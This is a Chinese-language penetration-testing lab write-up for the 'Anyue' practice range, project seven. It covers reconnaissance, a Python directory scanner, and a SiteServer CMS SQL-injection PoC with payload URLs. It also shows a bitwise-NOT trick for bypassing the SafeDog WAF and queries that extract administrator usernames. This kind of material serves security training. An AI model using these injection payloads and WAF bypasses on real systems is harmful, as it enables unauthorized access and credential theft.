<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>暗月渗透实战靶场-项目七 | like4h</title><meta name="keywords" content="红队,暗月渗透实战靶场"><meta name="author" content="like4h"><meta name="copyright" content="like4h"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="暗月渗透实战靶场-项目七  环境配置 使用的是暗月提供的环境 直接虚拟机运行即可  设置网络环境  配置完成即可  网络拓扑   网络测试  外网 对于外网的主机144、我们是无法进行ping的、防火墙是拦截了ping的数据包的 我们可以直接访问、能访问成功说明外网的环境配置没有问题   内网 由于内网防火墙的设置、也是禁用了ping命令的 web机与OA办公机是无法互相ping的、验证的方式只">
<meta property="og:type" content="article">
<meta property="og:title" content="暗月渗透实战靶场-项目七">
<meta property="og:url" content="http://example.com/2022/02/23/1823398161.html">
<meta property="og:site_name" content="like4h">
<meta property="og:description" content="暗月渗透实战靶场-项目七  环境配置 使用的是暗月提供的环境 直接虚拟机运行即可  设置网络环境  配置完成即可  网络拓扑   网络测试  外网 对于外网的主机144、我们是无法进行ping的、防火墙是拦截了ping的数据包的 我们可以直接访问、能访问成功说明外网的环境配置没有问题   内网 由于内网防火墙的设置、也是禁用了ping命令的 web机与OA办公机是无法互相ping的、验证的方式只">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2022/04/08/RLAX9PN5ZmHuzgb.png">
<meta property="article:published_time" content="2022-02-23T13:52:39.000Z">
<meta property="article:modified_time" content="2022-05-19T14:06:54.951Z">
<meta property="article:author" content="like4h">
<meta property="article:tag" content="红队">
<meta property="article:tag" content="暗月渗透实战靶场">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2022/04/08/RLAX9PN5ZmHuzgb.png"><link rel="shortcut icon" href="/img/index/avater.jpg"><link rel="canonical" href="http://example.com/2022/02/23/1823398161"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu-site-verification" content="6e49742deeebc779b29d507edd20bad8"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?8903f8597aac32d70805a4aae2c824e1";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '暗月渗透实战靶场-项目七',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-05-19 22:06:54'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/index/avater.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About Me</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2022/04/08/RLAX9PN5ZmHuzgb.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">like4h</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About Me</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">暗月渗透实战靶场-项目七</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-02-23T13:52:39.000Z" title="发表于 2022-02-23 21:52:39">2022-02-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-05-19T14:06:54.951Z" title="更新于 2022-05-19 22:06:54">2022-05-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BA%A2%E9%98%9F/">红队</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">6.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>27分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="暗月渗透实战靶场-项目七"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="暗月渗透实战靶场-项目七"><a class="markdownIt-Anchor" href="#暗月渗透实战靶场-项目七"></a> 暗月渗透实战靶场-项目七</h1>
<h2 id="环境配置"><a class="markdownIt-Anchor" href="#环境配置"></a> 环境配置</h2>
<p>使用的是暗月提供的环境</p>
<p>直接虚拟机运行即可</p>
<h3 id="设置网络环境"><a class="markdownIt-Anchor" href="#设置网络环境"></a> 设置网络环境</h3>
<p><img src="https://s2.loli.net/2022/04/10/gOrUckZeQ5lBszd.png" alt="image-20220122175014143" /></p>
<p>配置完成即可</p>
<h3 id="网络拓扑"><a class="markdownIt-Anchor" href="#网络拓扑"></a> 网络拓扑</h3>
<p><img src="https://s2.loli.net/2022/04/10/hwb2OuEZe54yXLa.png" alt="image-20220122175043635" /></p>
<h3 id="网络测试"><a class="markdownIt-Anchor" href="#网络测试"></a> 网络测试</h3>
<h4 id="外网"><a class="markdownIt-Anchor" href="#外网"></a> 外网</h4>
<p>对于外网的主机144、我们是无法进行ping的、防火墙是拦截了ping的数据包的</p>
<p>我们可以直接访问、能访问成功说明外网的环境配置没有问题</p>
<p><img src="https://s2.loli.net/2022/04/10/UltZfua5CPbjHSB.png" alt="image-20220122175217032" /></p>
<h4 id="内网"><a class="markdownIt-Anchor" href="#内网"></a> 内网</h4>
<p>由于内网防火墙的设置、也是禁用了ping命令的</p>
<p>web机与OA办公机是无法互相ping的、验证的方式只能是通过直接访问其ip的80、端口即可</p>
<h4 id="域控"><a class="markdownIt-Anchor" href="#域控"></a> 域控</h4>
<p>域控机器是没有设置防火墙的、也没有禁用ping、可以直接ping测试、</p>
<p><img src="https://s2.loli.net/2022/04/10/CrKgpxUQencPWYL.png" alt="image-20220122175539160" /></p>
<h2 id="00x1-信息搜集"><a class="markdownIt-Anchor" href="#00x1-信息搜集"></a> 00x1-信息搜集</h2>
<h3 id="ip确认"><a class="markdownIt-Anchor" href="#ip确认"></a> IP确认</h3>
<p>（内网是使用netdiscover、外网是使用ping查看或者是网站查询）</p>
<h4 id="netdiscover"><a class="markdownIt-Anchor" href="#netdiscover"></a> netdiscover</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo netdiscover -i eth0 -r 192.168.1.0/24 </span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/25Foy7KcxgPrmwQ.png" alt="image-20220122180059072" /></p>
<h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3>
<h4 id="masscan"><a class="markdownIt-Anchor" href="#masscan"></a> masscan</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo masscan -p 1-65535 192.168.1.150 --rate=1000</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/O2i8wcCflSE7NL3.png" alt="image-20220122180440882" /></p>
<h4 id="nmap"><a class="markdownIt-Anchor" href="#nmap"></a> nmap</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p 21,80,999,6588,5985 -sS -sC -v -A 192.168.1.114 -oA 114</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/bZhW4QOvmE8B9zF.png" alt="image-20220122180849235" /></p>
<p>这里我们还发现了目标机使用的dns解析的地址信息</p>
<p>由于前面我们在访问的时候就知道是访问不了的肯定是需要进行域名的绑定的</p>
<p><img src="https://s2.loli.net/2022/04/10/l7AxPgObWs9zXki.png" alt="image-20220122181223732" /></p>
<p>再次访问</p>
<p><img src="https://s2.loli.net/2022/04/10/OPFCZ9sDYGUuL3H.png" alt="image-20220122181414380" /></p>
<p>网站有安全狗</p>
<h3 id="whataweb查询网站的cms"><a class="markdownIt-Anchor" href="#whataweb查询网站的cms"></a> whataweb查询网站的cms</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb www.moonlab.com</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/iEsHponWQhDMXGa.png" alt="image-20220122181526589" /></p>
<p>WAF拦截</p>
<h3 id="查询网站目录信息"><a class="markdownIt-Anchor" href="#查询网站目录信息"></a> 查询网站目录信息</h3>
<h4 id="使用dirsearch"><a class="markdownIt-Anchor" href="#使用dirsearch"></a> 使用dirsearch</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py  -u &quot;www.moonlab.com&quot; -t 1 -e*</span><br><span class="line"></span><br><span class="line">由于有waf的存在这里要注意扫描的速度不能太快</span><br></pre></td></tr></table></figure>
<h5 id="小插曲"><a class="markdownIt-Anchor" href="#小插曲"></a> 小插曲</h5>
<p>但是我们在使用的时候发现dirsearch是没有办法进行扫描的、直接就是报错</p>
<p><img src="https://s2.loli.net/2022/04/10/vnYefAwMSir9uoD.png" alt="image-20220123163916643" /></p>
<p>意思就是访问不到目标</p>
<p>但是网站是真实存在的</p>
<p><img src="https://s2.loli.net/2022/04/10/HnRmvrJXxSz5FwP.png" alt="image-20220123163945564" /></p>
<p>这个当时自己扫的时候一直是报错、一度怀疑是源码的问题、弄了半天原来是url的问题</p>
<h4 id="使用gobuster"><a class="markdownIt-Anchor" href="#使用gobuster"></a> 使用gobuster</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://www.moonlab.com -w /usr/share/wordlists/dirb/big.txt -t 50 </span><br></pre></td></tr></table></figure>
<p>和上面的扫描同款问题</p>
<p><img src="https://s2.loli.net/2022/04/10/nfzIC8k5p4ZD1Tt.png" alt="image-20220123164237375" /></p>
<h4 id="使用dirmap"><a class="markdownIt-Anchor" href="#使用dirmap"></a> 使用dirmap</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirmap.py -i http://www.webhack123.com -lcf</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/RGAzv8wIFumViUP.png" alt="image-20220123120550844" /></p>
<p>并发过高会被拦截</p>
<p><img src="https://s2.loli.net/2022/04/10/8kxsyiBgZS5mrQ6.png" alt="image-20220123120610600" /></p>
<p>使用工具进行扫描的时候都是没有办法进行的.</p>
<p>学着样子自己写一个目录遍历的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> cgitb <span class="keyword">import</span> reset</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># url = &quot;http://www.moonlab.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&#x27;dicc.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> readfile:</span><br><span class="line">  <span class="keyword">for</span> dirs <span class="keyword">in</span> readfile.readlines():</span><br><span class="line">    url = <span class="string">&#x27;http://www.moonlab.com/&#x27;</span>+dirs.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    resp = requests.get(url)</span><br><span class="line">    strlen = <span class="built_in">len</span>(resp.text)</span><br><span class="line">    <span class="built_in">print</span>(url+<span class="string">&#x27;---statu---&#x27;</span>+<span class="built_in">str</span>(resp.status_code)+<span class="string">&#x27;---lens---&#x27;</span>+<span class="built_in">str</span>(strlen))</span><br><span class="line">    <span class="comment">#sys.exit()</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> resp.status_code == <span class="number">200</span> <span class="keyword">or</span> resp.status_code == <span class="number">403</span> <span class="keyword">or</span> resp.status_code == <span class="number">500</span> <span class="keyword">or</span> resp.status_code == <span class="number">301</span>:</span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">str</span>(strlen) !=  <span class="string">&quot;2939&quot;</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;url.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> writefile:</span><br><span class="line">          writefile.write(url+<span class="string">&#x27;---statu---&#x27;</span>+<span class="built_in">str</span>(resp.status_code)+<span class="string">&#x27;---lens---&#x27;</span>+<span class="built_in">str</span>(strlen)+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>然后我们找到一些相关的文件</p>
<p><img src="https://s2.loli.net/2022/04/10/GfJsAQN3FB8qxPj.png" alt="image-20220123221018165" /></p>
<p>访问</p>
<p><img src="https://s2.loli.net/2022/04/10/EsMpctFgHjaAzLP.png" alt="image-20220123221131389" /></p>
<h2 id="00x2-漏洞利用"><a class="markdownIt-Anchor" href="#00x2-漏洞利用"></a> 00x2-漏洞利用</h2>
<h3 id="steserver后台管理页面泄露"><a class="markdownIt-Anchor" href="#steserver后台管理页面泄露"></a> steserver后台管理页面泄露</h3>
<p><img src="https://s2.loli.net/2022/04/10/6jPKBUgXCqZEh5d.png" alt="image-20220123200231919" /></p>
<p>查看当前版本</p>
<p><img src="https://s2.loli.net/2022/04/10/EhoyOXeRbDNVxzk.png" alt="image-20220123200300205" /></p>
<h3 id="漏洞查询"><a class="markdownIt-Anchor" href="#漏洞查询"></a> 漏洞查询</h3>
<p>然后进行相关漏洞的一些搜索</p>
<p><img src="https://s2.loli.net/2022/04/10/D31dCgLmo8AbNKn.png" alt="image-20220123200354213" /></p>
<h3 id="后台sql注入"><a class="markdownIt-Anchor" href="#后台sql注入"></a> 后台sql注入</h3>
<p>发现在steserver中确实是存在sql注入</p>
<p>这里找到两个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/w-digital-scanner/w9scan</span><br><span class="line">https://github.com/hmoytx/WVS</span><br></pre></td></tr></table></figure>
<p>但是后者没有前者的稳定好用、我们这里使用的是前者W9Scan</p>
<p>找到steserver的相关poc</p>
<p><img src="https://s2.loli.net/2022/04/10/lPqhuJC9V8RgSQ3.png" alt="image-20220124162327675" /></p>
<h4 id="poc测试"><a class="markdownIt-Anchor" href="#poc测试"></a> poc测试</h4>
<p>修改版</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ps=[</span><br><span class="line">        <span class="string">&#x27;siteserver/service/background_taskLog.aspx?Keyword=test%%27%20and%20convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version))=1%20and%202=%271&amp;DateFrom=&amp;DateTo=&amp;IsSuccess=All&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNameCollection=test%27)%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=2;%20--&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;siteserver/bbs/background_keywordsFilting.aspx?grade=0&amp;categoryid=0&amp;keyword=test%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%202=%271&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;siteserver/userRole/background_administrator.aspx?RoleName=%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%201=%271&amp;PageNum=0&amp;Keyword=test&amp;AreaID=0&amp;LastActivityDate=0&amp;Order=UserName&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;siteserver/userRole/background_user.aspx?PageNum=0&amp;Keyword=%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%201=%27&amp;CreateDate=0&amp;LastActivityDate=0&amp;TypeID=0&amp;DepartmentID=0&amp;AreaID=0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;siteserver/bbs/background_thread.aspx?UserName=test&amp;Title=%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version%20and%201=%27&amp;DateFrom=&amp;DateTo=&amp;ForumID=0&#x27;</span>,</span><br><span class="line">        ]</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> ps:</span><br><span class="line">    url=<span class="string">&quot;http://www.moonlab.com/&quot;</span>+p</span><br><span class="line">    res = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> res.status_code==<span class="number">500</span> <span class="keyword">and</span> <span class="string">&quot;GAOJIMicrosoft&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">      <span class="built_in">print</span>(url+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;-------------------------------&#x27;</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">      <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/05/18/i2XslLytvgPUzZa.png" alt="image-20220124170542619" /></p>
<p>关于上面的WVS的poc检测也是一样的</p>
<p><img src="https://s2.loli.net/2022/04/10/8pjusSgnDOQ7JaA.png" alt="image-20220124171345565" /></p>
<p>找到能用的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNameCollection=test%27)%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=2;%20--</span><br></pre></td></tr></table></figure>
<p>访问</p>
<p><img src="https://s2.loli.net/2022/05/18/ubMwZC4dGTX3EkN.png" alt="image-20220124170741023" /></p>
<h3 id="安全狗绕过"><a class="markdownIt-Anchor" href="#安全狗绕过"></a> 安全狗绕过</h3>
<p>已经确认的安全语句</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNameCollection=test%27)%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=2;%20--</span><br><span class="line">url解码</span><br><span class="line">http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe&#x27;&amp;UserNameCollection=test&#x27;) and char(71)+char(65)+char(79)+char(74)+char(73)+@@version=2; --</span><br></pre></td></tr></table></figure>
<p>上面的十六进制解码</p>
<p><img src="https://s2.loli.net/2022/04/10/jefG63pATHlzgZk.png" alt="image-20220124211451832" /></p>
<p>然后尝试查询数据库名称</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNameCollection=test%27)and%20db_name()=2;%20--</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/uIOrZchGpRJ9LPW.png" alt="image-20220124211543612" /></p>
<p>sql注入被拦截</p>
<h4 id="绕过"><a class="markdownIt-Anchor" href="#绕过"></a> 绕过</h4>
<p>使用按位取反绕过</p>
<p>=~1</p>
<h4 id="参考连接"><a class="markdownIt-Anchor" href="#参考连接"></a> 参考连接</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">按位取反绕过防火墙</span><br><span class="line">http://cn-sec.com/archives/317348.html</span><br><span class="line">安全狗绕过：</span><br><span class="line">https://xz.aliyun.com/t/8000</span><br><span class="line">https://xz.aliyun.com/t/7572</span><br><span class="line">https://cloud.tencent.com/developer/article/1674113</span><br></pre></td></tr></table></figure>
<h4 id="绕过测试"><a class="markdownIt-Anchor" href="#绕过测试"></a> 绕过测试</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNameCollection=test%27)and%20db_name()=~2;%20--</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/3mQfutnibaeALM9.png" alt="image-20220124212955063" /></p>
<h3 id="查询数据库用户密码"><a class="markdownIt-Anchor" href="#查询数据库用户密码"></a> 查询数据库用户密码</h3>
<p>针对数据库中的用户名密码来查询</p>
<p>前面我们已经知道这个是个steserver的框架、对于数据结构我们可以直接在搜索引擎上进行搜索</p>
<p>这里直接列出该数据表的功能</p>
<p><img src="https://s2.loli.net/2022/04/10/DKnjTMHUEQaPvRX.png" alt="image-20220124211107748" /></p>
<p>确定数据库用户名密码所在的数据表</p>
<p>进行查询</p>
<p>这里为了防止安全狗、我们一次查询的数量不会太多、一次一条</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select top1 username from [msmoonlab].[msmoonlab].[bairong_Administrator]</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/EXstDJzcAZeGQvI.png" alt="" /></p>
<p>测试</p>
<p><img src="https://s2.loli.net/2022/04/10/fAlZ6W7gVvbqNuJ.png" alt="image-20220125152728050" /></p>
<p>安全狗拦截</p>
<p>取反放在前面测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?UnLock=sdfe&#x27;&amp;UserNameCollection=test&#x27;)and ~1= select top 1 username  from [msmoonlab].[msmoonlab].[bairong_Administrator]; --</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/04/10/DemXr59UHziFTBQ.png" alt="image-20220125152952457" /></p>
<p>可以过安全狗、但是语句说是select附近出现错误</p>
<p>加括号</p>
<p><img src="https://s2.loli.net/2022/04/10/yWHvQxpiUwboZ4a.png" alt="image-20220125154028829" /></p>
<p>成功执行</p>
<h4 id="查询到用户名"><a class="markdownIt-Anchor" href="#查询到用户名"></a> 查询到用户名</h4>
<p>admin</p>
